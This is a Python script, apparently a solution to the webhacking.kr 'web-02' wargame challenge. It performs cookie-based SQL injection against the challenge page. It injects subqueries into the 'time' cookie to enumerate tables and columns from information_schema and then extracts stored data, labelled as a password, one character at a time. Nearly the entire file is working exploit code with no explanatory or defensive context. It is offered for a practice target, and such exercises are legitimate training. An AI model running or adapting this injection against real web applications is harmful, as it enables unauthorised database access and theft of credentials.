from urllib.request import urlopen
import urllib
import requests

name = ""
count = ''
length = 0

url = "https://webhacking.kr/challenge/web-02"
session = "your session"

print ("! Start")

# Table number
print ("! Find the number of tables")
try:
	cookie = "(select count(table_name) from information_schema.tables where table_schema=database())"
	cookies = { 'time' : cookie, 'PHPSESSID' : session }
	r = requests.post(url, cookies=cookies)
	length = r.text
except:
	print('! Error')
length = length[22:24]
count = int(length)
print ("! Found the number of tables : ", int(length))

#Table name length
print ("\n! Find length of the tables_name")
tlen = [count]
for i in range(0, count):
	try:
		cookie = f"(select length(table_name) from information_schema.tables where table_schema=database() limit {i}, 1)"
		cookies = { 'time' : cookie, 'PHPSESSID' : session }
		r = requests.post(url, cookies=cookies)
	except:
		print('! Error')
		continue
	length = r.text
	length = int(length[22:24])

	tlen.insert(i, length)
	print ("! Found length : ", tlen[i])

#table name
print ("\n! Find table_name")
tname = [count]
for j in range(0, count):
	name = ''

	for i in range(1, tlen[j]+1):
		try:
			cookie = f"(select ascii(substring(table_name, {i}, 1)) from information_schema.tables where table_schema=database() limit {j},1)"
			cookies = { 'PHPSESSID' : session, 'time' : cookie}
			r = requests.post(url, cookies=cookies)
		except:
			print ("! Error")
			continue
		length = r.text
		length = length[19:24]
		if "01:" in length:
			length = length.replace("01:", "")
			length = int(length) + 60
			name += chr(length)
			tname.insert(j, name)
			print ("! name : " + name)
	print ("! Found name : " + tname[j])

#column length
print ("\n! Find length of the columns_name")
plen = [count]
for i in range(0, count):
	try:
		cookie = f"(select length(column_name) from information_schema.columns where table_name='{tname[i]}' limit 0, 1)"
		cookies = { 'time' : cookie, 'PHPSESSID' : session }
		r = requests.post(url, cookies=cookies)
	except:
		print('! Error')
		continue
	length = r.text
	length = int(length[22:24])
	plen.insert(i, length)
	print ("! Found length : ", plen[i])

#column name
print ("\n! Find column_name")
cname = [count]
for j in range(0, count):
	name = ''
	for i in range(1, plen[j]+1):
		try:
			cookie = f"(select ascii(substring(column_name, {i}, 1)) from information_schema.columns where table_name='{tname[j]}' limit 0,1)"
			cookies = { 'PHPSESSID' : session, 'time' : cookie}
			r = requests.post(url, cookies=cookies)
		except:
			print ("! Error")
			continue
		length = r.text
		length = length[19:24]
		if "01:" in length:
			length = length.replace("01:", "")
			length = int(length) + 60
			name += chr(length)
			cname.insert(j, name)
			print ("! name : " + name)
	print ("! Found name : " + cname[j])

#pw(data) length
print ("\n! Find length of data")
dlength = [count]
for i in range(0, count):
	try:
		cookie = f"(select length({cname[i]}) from {tname[i]})"
		cookies = { 'time' : cookie, 'PHPSESSID' : session }
		r = requests.post(url, cookies=cookies)
	except:
		print("! Error")
		continue
	length = r.text
	length = int(length[22:24])
	dlength.insert(i,length)
	print("! Found length : ", dlength[i])

# #pw(data)
print ("\n! Find data")
dname = [count]
for j in range(0, count):
	name = ''
	for i in range(1, dlength[j]+1):
		try:
			cookie = f"(select ascii(substring({cname[j]}, {i}, 1)) from {tname[j]} limit 0, 1)"
			cookies = { 'time' : cookie, 'PHPSESSID' : session }
			r = requests.post(url, cookies=cookies)
		except:
			print("! Error")
			continue
		length = r.text
		length = length[19:24]
		if "01:" in length:
			length = length.replace("01:", "")
			length = int(length) + 60
			name += chr(length)
			dname.insert(j, name)
			print("! data : ", dname[j])
	print("! Found data : ", dname[j])
